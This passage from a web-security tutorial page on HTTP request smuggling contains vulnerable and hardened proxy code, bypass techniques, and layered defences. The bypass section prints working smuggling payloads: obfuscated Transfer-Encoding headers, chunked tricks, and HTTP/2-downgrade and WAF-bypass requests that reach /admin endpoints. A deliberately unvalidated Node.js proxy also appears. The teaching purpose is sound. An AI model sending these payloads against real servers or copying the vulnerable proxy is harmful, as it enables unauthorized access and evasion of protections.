    <span class="code-attr">listen</span> <span class="code-number">80</span>;
    <span class="code-attr">server_name</span> <span class="code-string">api.example.com</span>;

    <span class="code-comment"># SECURITY: Reject requests with both Content-Length and Transfer-Encoding</span>
    <span class="code-keyword">if</span> (<span class="code-string">$http_transfer_encoding</span> <span class="code-keyword">~</span> <span class="code-string">"chunked"</span>) {
        <span class="code-keyword">set</span> <span class="code-string">$te_present</span> <span class="code-number">1</span>;
    }
    <span class="code-keyword">if</span> (<span class="code-string">$http_content_length</span> <span class="code-keyword">~</span> <span class="code-string">"^[0-9]+$"</span>) {
        <span class="code-keyword">set</span> <span class="code-string">$cl_present</span> <span class="code-number">1</span>;
    }
    <span class="code-keyword">if</span> (<span class="code-string">$te_present$cl_present</span> = <span class="code-number">11</span>) {
        <span class="code-keyword">return</span> <span class="code-number">400</span> <span class="code-string">"Bad Request: Ambiguous message framing"</span>;
    }

    <span class="code-attr">location</span> <span class="code-string">/</span> {
        <span class="code-attr">proxy_pass</span> <span class="code-string">http://backend:8080</span>;
        <span class="code-attr">proxy_set_header</span> <span class="code-string">Host</span> <span class="code-string">$host</span>;
        
        <span class="code-comment"># SECURITY: Normalize HTTP version and enforce protocol compliance</span>
        <span class="code-attr">proxy_http_version</span> <span class="code-number">1.1</span>;
        <span class="code-attr">proxy_set_header</span> <span class="code-string">Connection</span> <span class="code-string">""</span>;
        
        <span class="code-comment"># SECURITY: Buffer entire request before forwarding</span>
        <span class="code-attr">proxy_buffering</span> <span class="code-keyword">on</span>;
        <span class="code-attr">proxy_request_buffering</span> <span class="code-keyword">on</span>;
        <span class="code-attr">proxy_buffer_size</span> <span class="code-number">4k</span>;
        <span class="code-attr">proxy_buffers</span> <span class="code-number">8</span> <span class="code-number">4k</span>;
        
        <span class="code-comment"># SECURITY: Timeout configurations</span>
        <span class="code-attr">proxy_read_timeout</span> <span class="code-number">30s</span>;
        <span class="code-attr">proxy_send_timeout</span> <span class="code-number">30s</span>;
    }
}</code></pre>
        </div>

        <h3 class="subsection-title">Lab 2: Secure HTTP Parser in Node.js</h3>
        <p class="text-content">
          Implementing a secure HTTP client that validates message framing before processing.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">❌ Vulnerable Node.js Proxy</span></div>
          <pre><code><span class="code-keyword">const</span> http = <span class="code-function">require</span>(<span class="code-string">'http'</span>);
<span class="code-keyword">const</span> httpProxy = <span class="code-function">require</span>(<span class="code-string">'http-proxy'</span>);

<span class="code-keyword">const</span> proxy = httpProxy.<span class="code-function">createProxyServer</span>({});

<span class="code-keyword">const</span> server = http.<span class="code-function">createServer</span>((<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    <span class="code-comment">// VULNERABLE: No validation of conflicting headers</span>
    <span class="code-comment">// Directly forwards request to target</span>
    proxy.<span class="code-function">web</span>(req, res, {
        <span class="code-attr">target</span>: <span class="code-string">'http://backend:3000'</span>
    });
});

server.<span class="code-function">listen</span>(<span class="code-number">80</span>);</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Secure Node.js Implementation</span></div>
          <pre><code><span class="code-keyword">const</span> http = <span class="code-function">require</span>(<span class="code-string">'http'</span>);
<span class="code-keyword">const</span> httpProxy = <span class="code-function">require</span>(<span class="code-string">'http-proxy'</span>);

<span class="code-keyword">class</span> <span class="code-function">SecureHTTPProxy</span> {
    <span class="code-function">constructor</span>() {
        <span class="code-keyword">this</span>.proxy = httpProxy.<span class="code-function">createProxyServer</span>({
            <span class="code-attr">proxyTimeout</span>: <span class="code-number">30000</span>,
            <span class="code-attr">timeout</span>: <span class="code-number">30000</span>
        });
    }

    <span class="code-function">validateRequest</span>(<span class="code-attr">req</span>) {
        <span class="code-keyword">const</span> headers = req.headers;
        
        <span class="code-comment">// SECURITY: Check for conflicting framing headers</span>
        <span class="code-keyword">const</span> hasContentLength = <span class="code-string">'content-length'</span> <span class="code-keyword">in</span> headers;
        <span class="code-keyword">const</span> hasTransferEncoding = headers[<span class="code-string">'transfer-encoding'</span>] !== <span class="code-keyword">undefined</span>;
        
        <span class="code-keyword">if</span> (hasContentLength && hasTransferEncoding) {
            <span class="code-comment">// RFC 7230 Section 3.3.3: If both present, Transfer-Encoding overrides</span>
            <span class="code-comment">// But for security, we should reject ambiguous requests</span>
            <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Ambiguous message framing: Both Content-Length and Transfer-Encoding present'</span>);
        }

        <span class="code-comment">// SECURITY: Validate Transfer-Encoding format</span>
        <span class="code-keyword">if</span> (hasTransferEncoding) {
            <span class="code-keyword">const</span> te = headers[<span class="code-string">'transfer-encoding'</span>].<span class="code-function">toLowerCase</span>();
            <span class="code-keyword">if</span> (!te.<span class="code-function">includes</span>(<span class="code-string">'chunked'</span>) && !te.<span class="code-function">includes</span>(<span class="code-string">'identity'</span>)) {
                <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Invalid Transfer-Encoding value'</span>);
            }
        }

        <span class="code-comment">// SECURITY: Validate Content-Length is numeric</span>
        <span class="code-keyword">if</span> (hasContentLength) {
            <span class="code-keyword">const</span> cl = headers[<span class="code-string">'content-length'</span>];
            <span class="code-keyword">if</span> (!<span class="code-string">/^\d+$/</span>.<span class="code-function">test</span>(cl)) {
                <span class="code-keyword">throw</span> <span class="code-keyword">new</span> <span class="code-function">Error</span>(<span class="code-string">'Invalid Content-Length format'</span>);
            }
        }

        <span class="code-keyword">return</span> <span class="code-keyword">true</span>;
    }

    <span class="code-function">handleRequest</span>(<span class="code-attr">req</span>, <span class="code-attr">res</span>) {
        <span class="code-keyword">try</span> {
            <span class="code-keyword">this</span>.<span class="code-function">validateRequest</span>(req);
            
            <span class="code-comment">// SECURITY: Disable keep-alive to prevent request concatenation</span>
            req.headers[<span class="code-string">'connection'</span>] = <span class="code-string">'close'</span>;
            
            <span class="code-keyword">this</span>.proxy.<span class="code-function">web</span>(req, res, {
                <span class="code-attr">target</span>: <span class="code-string">'http://backend:3000'</span>,
                <span class="code-attr">changeOrigin</span>: <span class="code-keyword">true</span>
            });
        } <span class="code-keyword">catch</span> (<span class="code-attr">err</span>) {
            console.<span class="code-function">error</span>(<span class="code-string">'Security violation:'</span>, err.message);
            res.<span class="code-function">writeHead</span>(<span class="code-number">400</span>, { <span class="code-string">'Content-Type'</span>: <span class="code-string">'text/plain'</span> });
            res.<span class="code-function">end</span>(<span class="code-string">'Bad Request: '</span> + err.message);
        }
    }
}

<span class="code-keyword">const</span> secureProxy = <span class="code-keyword">new</span> <span class="code-function">SecureHTTPProxy</span>();
<span class="code-keyword">const</span> server = http.<span class="code-function">createServer</span>((<span class="code-attr">req</span>, <span class="code-attr">res</span>) => {
    secureProxy.<span class="code-function">handleRequest</span>(req, res);
});

server.<span class="code-function">listen</span>(<span class="code-number">80</span>, () => {
    console.<span class="code-function">log</span>(<span class="code-string">'Secure proxy listening on port 80'</span>);
});</code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: Python Secure HTTP Server</h3>
        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">✅ Python Secure HTTP Handler</span></div>
          <pre><code><span class="code-keyword">import</span> http.server
<span class="code-keyword">import</span> socketserver
<span class="code-keyword">import</span> re

<span class="code-keyword">class</span> <span class="code-function">SecureHTTPRequestHandler</span>(http.server.BaseHTTPRequestHandler):
    <span class="code-string">"""Secure HTTP handler that prevents request smuggling attacks"""</span>
    
    <span class="code-function">BLOCKED_HEADERS</span> = {
        <span class="code-string">'transfer-encoding'</span>,
        <span class="code-string">'content-length'</span>
    }
    
    <span class="code-keyword">def</span> <span class="code-function">validate_framing</span>(self):
        <span class="code-string">"""Validate HTTP message framing headers"""</span>
        headers = self.headers
        
        <span class="code-comment"># Check for conflicting headers</span>
        has_cl = <span class="code-string">'Content-Length'</span> <span class="code-keyword">in</span> headers
        has_te = <span class="code-string">'Transfer-Encoding'</span> <span class="code-keyword">in</span> headers
        
        <span class="code-keyword">if</span> has_cl <span class="code-keyword">and</span> has_te:
            self.<span class="code-function">send_error</span>(<span class="code-number">400</span>, <span class="code-string">"Bad Request"</span>, 
                           <span class="code-string">"Ambiguous message framing: Both CL and TE present"</span>)
            <span class="code-keyword">return</span> <span class="code-keyword">False</span>
        
        <span class="code-comment"># Validate Content-Length format</span>
        <span class="code-keyword">if</span> has_cl:
            cl_value = headers[<span class="code-string">'Content-Length'</span>]
            <span class="code-keyword">if</span> <span class="code-keyword">not</span> re.<span class="code-function">match</span>(<span class="code-string">r'^\d+$'</span>, cl_value):
                self.<span class="code-function">send_error</span>(<span class="code-number">400</span>, <span class="code-string">"Bad Request"</span>,
                               <span class="code-string">"Invalid Content-Length format"</span>)
                <span class="code-keyword">return</span> <span class="code-keyword">False</span>
        
        <span class="code-comment"># Validate Transfer-Encoding</span>
        <span class="code-keyword">if</span> has_te:
            te_value = headers[<span class="code-string">'Transfer-Encoding'</span>].<span class="code-function">lower</span>()
            <span class="code-keyword">if</span> <span class="code-string">'chunked'</span> <span class="code-keyword">not in</span> te_value <span class="code-keyword">and</span> <span class="code-string">'identity'</span> <span class="code-keyword">not in</span> te_value:
                self.<span class="code-function">send_error</span>(<span class="code-number">400</span>, <span class="code-string">"Bad Request"</span>,
                               <span class="code-string">"Invalid Transfer-Encoding"</span>)
                <span class="code-keyword">return</span> <span class="code-keyword">False</span>
        
        <span class="code-keyword">return</span> <span class="code-keyword">True</span>
    
    <span class="code-keyword">def</span> <span class="code-function">do_POST</span>(self):
        <span class="code-keyword">if</span> <span class="code-keyword">not</span> self.<span class="code-function">validate_framing</span>():
            <span class="code-keyword">return</span>
        
        <span class="code-comment"># Process request securely...</span>
        self.<span class="code-function">send_response</span>(<span class="code-number">200</span>)
        self.<span class="code-function">end_headers</span>()
        self.wfile.<span class="code-function">write</span>(<span class="code-string">b"Request processed securely"</span>)

<span class="code-keyword">def</span> <span class="code-function">run_server</span>(port=<span class="code-number">8080</span>):
    <span class="code-keyword">with</span> socketserver.TCPServer((<span class="code-string">""</span>, port), SecureHTTPRequestHandler) <span class="code-keyword">as</span> httpd:
        <span class="code-function">print</span>(<span class="code-string">f"Secure server running on port {port}"</span>)
        httpd.<span class="code-function">serve_forever</span>()

<span class="code-keyword">if</span> __name__ == <span class="code-string">"__main__"</span>:
    <span class="code-function">run_server</span>()</code></pre>
        </div>
      </div>

      <div id="bypass" class="content-card">
        <h2 class="card-title"><i>🚧</i> Bypass Techniques: Evading Detection</h2>

        <p class="text-content">
          Attackers employ sophisticated techniques to bypass WAFs, intrusion detection systems, and basic validation
          filters. Understanding these bypasses is essential for building robust defenses [^9^][^20^].
        </p>

        <h3 class="subsection-title">1. Header Obfuscation and Case Variations</h3>
        <p class="text-content">
          Different HTTP parsers normalize headers differently. Case variations, whitespace manipulation, and encoding
          tricks can fool security devices while still being processed by vulnerable backends.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Header Obfuscation Techniques</span></div>
          <pre><code><span class="code-comment">-- Case variations that bypass simple string matching</span>
<span class="code-attr">TrAnSfEr-EnCoDiNg:</span> <span class="code-string">chunked</span>
<span class="code-attr">TRANSFER-ENCODING:</span> <span class="code-string">chunked</span>
<span class="code-attr">transfer-encoding:</span> <span class="code-string">Chunked</span>

<span class="code-comment">-- Whitespace variations (tab, multiple spaces)</span>
<span class="code-attr">Transfer-Encoding:</span><span class="code-string">[tab]chunked</span>
<span class="code-attr">Transfer-Encoding:</span>  <span class="code-string">chunked</span>
<span class="code-attr">Transfer-Encoding:</span><span class="code-string">[space][tab]chunked</span>

<span class="code-comment">-- Line folding (deprecated but still supported by some parsers)</span>
<span class="code-attr">Transfer-Encoding:</span>
 <span class="code-string">chunked</span>

<span class="code-comment">-- Multiple headers with one invalid</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">identity</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-comment">-- Chunk extensions to confuse parsers</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked; boundary=abc</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Chunked Encoding Obfuscation</h3>
        <p class="text-content">
          The chunked transfer encoding format allows extensions and trailer headers that can be abused to create
          parsing discrepancies.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Chunked Encoding Tricks</span></div>
          <pre><code><span class="code-comment">-- Chunk extensions (ignored by some parsers)</span>
<span class="code-number">5</span><span class="code-string">;ext="value"</span>
<span class="code-string">hello</span>

<span class="code-comment">-- Hex chunk sizes with leading zeros</span>
<span class="code-number">00000005</span>
<span class="code-string">hello</span>

<span class="code-comment">-- Mixed case hex</span>
<span class="code-number">5</span><span class="code-string">;ignore=this</span>
<span class="code-string">hello</span>
<span class="code-number">0</span>
<span class="code-attr">X-Injected:</span> <span class="code-string">header</span>

<span class="code-comment">-- Whitespace in chunk size (some parsers accept)</span>
<span class="code-number"> 5 </span>
<span class="code-string">hello</span></code></pre>
        </div>

        <h3 class="subsection-title">3. HTTP/2 Downgrade Attacks</h3>
        <p class="text-content">
          When HTTP/2 requests are downgraded to HTTP/1.1, headers that are normally prohibited in HTTP/2 (like
          Transfer-Encoding) can be injected, creating desynchronization opportunities [^4^].
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">HTTP/2 Downgrade Bypass</span></div>
          <pre><code><span class="code-comment">-- HTTP/2 pseudo-headers with injected TE</span>
<span class="code-keyword">:method:</span> <span class="code-string">POST</span>
<span class="code-keyword">:path:</span> <span class="code-string">/api/endpoint</span>
<span class="code-keyword">:authority:</span> <span class="code-string">target.com</span>
<span class="code-attr">content-length:</span> <span class="code-number">0</span>
<span class="code-attr">transfer-encoding:</span> <span class="code-string">chunked</span>  <span class="code-comment">-- Injected during downgrade!</span>

<span class="code-number">0</span>

<span class="code-keyword">GET</span> <span class="code-string">/admin HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>

<span class="code-comment">-- Frontend (HTTP/2): Ignores TE, uses CL=0</span>
<span class="code-comment">-- Backend (HTTP/1.1): Sees TE: chunked, processes smuggled request</span></code></pre>
        </div>

        <h3 class="subsection-title">4. Pipeline and Keep-Alive Manipulation</h3>
        <p class="text-content">
          HTTP/1.1 keep-alive connections allow multiple requests on a single connection. Attackers can manipulate
          connection headers to ensure their smuggled request is concatenated with a victim's request.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">Connection Manipulation</span></div>
          <pre><code><span class="code-comment">-- Force keep-alive to maintain connection for smuggling</span>
<span class="code-attr">Connection:</span> <span class="code-string">keep-alive</span>

<span class="code-comment">-- Connection header injection in HTTP/2</span>
<span class="code-attr">connection:</span> <span class="code-string">keep-alive</span>  <span class="code-comment">-- Invalid in HTTP/2 but passed through during downgrade</span>

<span class="code-comment">-- Using Upgrade header to switch protocols</span>
<span class="code-attr">Upgrade:</span> <span class="code-string">h2c</span>
<span class="code-attr">HTTP2-Settings:</span> <span class="code-string">AAMAAABkAARAAAAAAAIAAAAA</span></code></pre>
        </div>

        <h3 class="subsection-title">5. WAF Bypass via Request Smuggling</h3>
        <p class="text-content">
          Request smuggling can be used to bypass WAFs entirely. The WAF sees one request while the backend processes a
          completely different, malicious request.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header"><span class="code-label">WAF Bypass Payload</span></div>
          <pre><code><span class="code-comment">-- WAF sees this benign request:</span>
<span class="code-keyword">POST</span> <span class="code-string">/search HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Length:</span> <span class="code-number">7</span>
<span class="code-attr">Transfer-Encoding:</span> <span class="code-string">chunked</span>

<span class="code-number">0</span>

<span class="code-string">x=1</span>

<span class="code-comment">-- Backend sees (and WAF misses):</span>
<span class="code-keyword">POST</span> <span class="code-string">/admin/delete HTTP/1.1</span>
<span class="code-attr">Host:</span> <span class="code-string">target.com</span>
<span class="code-attr">Content-Type:</span> <span class="code-string">application/x-www-form-urlencoded</span>

<span class="code-string">id=1</span>

<span class="code-comment">-- WAF only inspected the first request, malicious request bypassed controls</span></code></pre>
        </div>
      </div>

      <div id="mitigation" class="content-card">
        <h2 class="card-title"><i>🛡️</i> Prevention Checklist: Eliminating HRS Forever</h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never allow ambiguous HTTP message framing. Implement strict protocol validation
          at every tier, normalize requests at the edge, and ensure all components in the request chain parse HTTP
          identically. When in doubt, reject the request.
        </div>

        <h3 class="subsection-title">Layer 1: Front-End Normalization</h3>
        <p class="text-content">
          The front-end proxy or load balancer must normalize all incoming requests before forwarding them to the
          backend. This is the most critical defense layer [^9^][^20^].
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Front-End Security Rules</span></div>
          <pre><code><span class="code-comment">-- Reject requests with both Content-Length and Transfer-Encoding</span>
<span class="code-keyword">if</span> (req.headers[<span class="code-string">'content-length'</span>] <span class="code-keyword">&&</span> req.headers[<span class="code-string">'transfer-encoding'</span>]) {
    <span class="code-keyword">return</span> <span class="code-number">400</span> <span class="code-string">"Ambiguous message framing"</span>;
}

<span class="code-comment">-- Normalize Transfer-Encoding header</span>
<span class="code-keyword">if</span> (req.headers[<span class="code-string">'transfer-encoding'</span>]) {
    <span class="code-keyword">const</span> te = req.headers[<span class="code-string">'transfer-encoding'</span>].<span class="code-function">toLowerCase</span>();
    <span class="code-keyword">if</span> (te !== <span class="code-string">'chunked'</span> && te !== <span class="code-string">'identity'</span>) {
        <span class="code-keyword">return</span> <span class="code-number">400</span> <span class="code-string">"Invalid Transfer-Encoding"</span>;
    }
}

<span class="code-comment">-- Validate Content-Length is a single, positive integer</span>
<span class="code-keyword">if</span> (req.headers[<span class="code-string">'content-length'</span>]) {
    <span class="code-keyword">const</span> cl = req.headers[<span class="code-string">'content-length'</span>];
    <span class="code-keyword">if</span> (!<span class="code-string">/^\d+$/</span>.<span class="code-function">test</span>(cl) || cl.<span class="code-function">includes</span>(<span class="code-string">','</span>)) {
        <span class="code-keyword">return</span> <span class="code-number">400</span> <span class="code-string">"Invalid Content-Length"</span>;
    }
}

<span class="code-comment">-- Strip or reject Connection headers</span>
<span class="code-keyword">delete</span> req.headers[<span class="code-string">'connection'</span>];
<span class="code-keyword">delete</span> req.headers[<span class="code-string">'keep-alive'</span>];
<span class="code-keyword">delete</span> req.headers[<span class="code-string">'proxy-connection'</span>];</code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: Protocol Enforcement</h3>
        <p class="text-content">
          Enforce strict HTTP protocol compliance at all layers. Use HTTP/2 end-to-end where possible, and disable
          HTTP/2 downgrade if not needed.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Protocol Enforcement Configuration</span></div>
          <pre><code><span class="code-comment"># Nginx: Disable HTTP/1.1 if using HTTP/2</span>
<span class="code-keyword">server</span> {
    <span class="code-attr">listen</span> <span class="code-number">443</span> <span class="code-keyword">ssl http2</span>;
    
    <span class="code-comment"># Force HTTP/2, reject HTTP/1.1</span>
    <span class="code-keyword">if</span> (<span class="code-string">$server_protocol</span> !~ <span class="code-string">"HTTP/2"</span>) {
        <span class="code-keyword">return</span> <span class="code-number">505</span>;
    }
}

<span class="code-comment"># HAProxy: Normalize requests</span>
<span class="code-keyword">frontend</span> <span class="code-string">https-in</span>
    <span class="code-attr">bind</span> <span class="code-string">*:443</span> <span class="code-keyword">ssl crt</span> <span class="code-string">/etc/ssl/certs/site.pem</span> <span class="code-keyword">alpn</span> <span class="code-string">h2</span>
    
    <span class="code-comment"># Reject ambiguous framing</span>
    <span class="code-attr">http-request</span> <span class="code-keyword">deny</span> <span class="code-keyword">if</span> { <span class="code-attr">req.hdr_cnt</span>(<span class="code-string">content-length)</span> <span class="code-keyword">gt</span> <span class="code-number">0</span> } { <span class="code-attr">req.hdr_cnt</span>(<span class="code-string">transfer-encoding)</span> <span class="code-keyword">gt</span> <span class="code-number">0</span> }
    
    <span class="code-attr">default_backend</span> <span class="code-string">app-servers</span>

<span class="code-comment"># Apache: mod_security rules</span>
<span class="code-keyword">SecRule</span> <span class="code-string">REQUEST_HEADERS:Transfer-Encoding</span> <span class="code-string">"@rx ."</span> \
    <span class="code-string">"id:1001,phase:1,deny,status:400,msg:'Transfer-Encoding not allowed'"</span></code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Backend Hardening</h3>
        <p class="text-content">
          Ensure backend servers are configured to reject ambiguous requests and use consistent parsing rules.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Backend Security Configuration</span></div>
          <pre><code><span class="code-comment"># Node.js/Express: Strict parsing</span>
<span class="code-keyword">const</span> express = <span class="code-function">require</span>(<span class="code-string">'express'</span>);
<span class="code-keyword">const</span> app = <span class="code-function">express</span>();

<span class="code-comment">// Reject requests with both CL and TE</span>
app.<span class="code-function">use</span>((<span class="code-attr">req</span>, <span class="code-attr">res</span>, <span class="code-attr">next</span>) => {
    <span class="code-keyword">const</span> hasCL = req.headers[<span class="code-string">'content-length'</span>] !== <span class="code-keyword">undefined</span>;
    <span class="code-keyword">const</span> hasTE = req.headers[<span class="code-string">'transfer-encoding'</span>] !== <span class="code-keyword">undefined</span>;
    
    <span class="code-keyword">if</span> (hasCL && hasTE) {
        <span class="code-keyword">return</span> res.<span class="code-function">status</span>(<span class="code-number">400</span>).<span class="code-function">send</span>(<span class="code-string">'Ambiguous framing'</span>);
    }
    <span class="code-function">next</span>();
});

<span class="code-comment"># Python/Django: Middleware</span>
<span class="code-keyword">class</span> <span class="code-function">RequestSmugglingMiddleware</span>:
    <span class="code-keyword">def</span> <span class="code-function">__init__</span>(self, get_response):
        self.get_response = get_response
    
    <span class="code-keyword">def</span> <span class="code-function">__call__</span>(self, request):
        <span class="code-keyword">if</span> <span class="code-string">'CONTENT_LENGTH'</span> <span class="code-keyword">in</span> request.META <span class="code-keyword">and</span> \
           <span class="code-string">'HTTP_TRANSFER_ENCODING'</span> <span class="code-keyword">in</span> request.META:
            <span class="code-keyword">return</span> HttpResponse(<span class="code-string">'Bad Request'</span>, status=<span class="code-number">400</span>)
        <span class="code-keyword">return</span> self.<span class="code-function">get_response</span>(request)</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Network Architecture</h3>
        <p class="text-content">
          Implement network-level controls to limit the impact of successful smuggling attacks.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Network Segmentation</span></div>
          <pre><code><span class="code-comment">-- AWS ALB Configuration: Enable HTTP desync mitigation mode</span>
<span class="code-string">aws elbv2 modify-load-balancer-attributes \</span>
<span class="code-string">    --load-balancer-arn arn:aws:elasticloadbalancing:... \</span>
<span class="code-string">    --attributes Key=routing.http.desync_mitigation_mode,Value=defensive</span>

<span class="code-comment">-- Modes: monitor (log only), defensive (block), strictest (aggressive blocking)</span>

<span class="code-comment">-- Cloudflare: Enable Strict Header Parsing</span>
<span class="code-comment">-- Dashboard: SSL/TLS → Edge Certificates → HTTP Strict Transport Security</span>

<span class="code-comment">-- Nginx: Connection limits and timeouts</span>
<span class="code-keyword">limit_conn_zone</span> <span class="code-string">$binary_remote_addr</span> <span class="code-keyword">zone=addr:10m</span>;
<span class="code-keyword">limit_conn</span> <span class="code-string">addr</span> <span class="code-number">10</span>;

<span class="code-attr">client_body_timeout</span> <span class="code-number">10s</span>;
<span class="code-attr">client_header_timeout</span> <span class="code-number">10s</span>;
<span class="code-attr">keepalive_timeout</span> <span class="code-number">5</span> <span class="code-number">5</span>;
<span class="code-attr">send_timeout</span> <span class="code-number">10s</span>;</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: Monitoring and Detection</h3>
        <p class="text-content">
          Implement comprehensive logging and alerting for suspicious HTTP patterns that may indicate smuggling
          attempts.
        </p>

        <div class="code-block code-secure">
          <div class="code-header"><span class="code-label">Security Monitoring Rules</span></div>
          <pre><code><span class="code-comment">-- Splunk detection query</span>
<span class="code-string">index=web_logs</span>
<span class="code-string">(status=400 OR status=501 OR status=405)</span>
<span class="code-string">(uri="*/admin*" OR uri="*/api/internal*")</span>
<span class="code-string">| stats count by src_ip, uri, status</span>
<span class="code-string">| where count > 10</span>
<span class="code-string">| eval risk=case(</span>
<span class="code-string">    match(uri, "(?i)admin"), "high",</span>
<span class="code-string">    match(uri, "(?i)internal"), "critical",</span>
<span class="code-string">    true(), "medium"</span>
<span class="code-string">)</span>

<span class="code-comment">-- WAF Rule for HRS detection</span>
<span class="code-keyword">SecRule</span> <span class="code-string">REQUEST_HEADERS:Content-Length</span> <span class="code-string">"@rx ."</span> \
    <span class="code-string">"chain,id:2001,phase:1,deny,status:400"</span>
    <span class="code-keyword">SecRule</span> <span class="code-string">REQUEST_HEADERS:Transfer-Encoding</span> <span class="code-string">"@rx ."</span>

<span class="code-comment">-- Alert on method anomalies (GPOST, GGET, etc.)</span>
<span class="code-keyword">SecRule</span> <span class="code-string">REQUEST_METHOD</span> <span class="code-string">"!@rx ^(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)$"</span> \
    <span class="code-string">"id:2002,phase:1,log,msg:'Anomalous HTTP method detected'"</span></code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Front-end Validation</td>
              <td style="padding: 0.75rem;">Reject requests with both CL and TE headers</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Header Normalization</td>
              <td style="padding: 0.75rem;">Strip or normalize TE headers at edge</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Protocol Consistency</td>
              <td style="padding: 0.75rem;">Use HTTP/2 end-to-end, avoid downgrade</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Request Buffering</td>
              <td style="padding: 0.75rem;">Buffer entire request before forwarding</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Connection Management</td>
              <td style="padding: 0.75rem;">Use separate connections to backend</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">WAF Configuration</td>
              <td style="padding: 0.75rem;">Enable strict HTTP parsing mode</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Monitoring</td>
              <td style="padding: 0.75rem;">Alert on method anomalies and 400 errors</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Defense in Depth for HRS</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete implementation of multi-layer HRS defense architecture]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>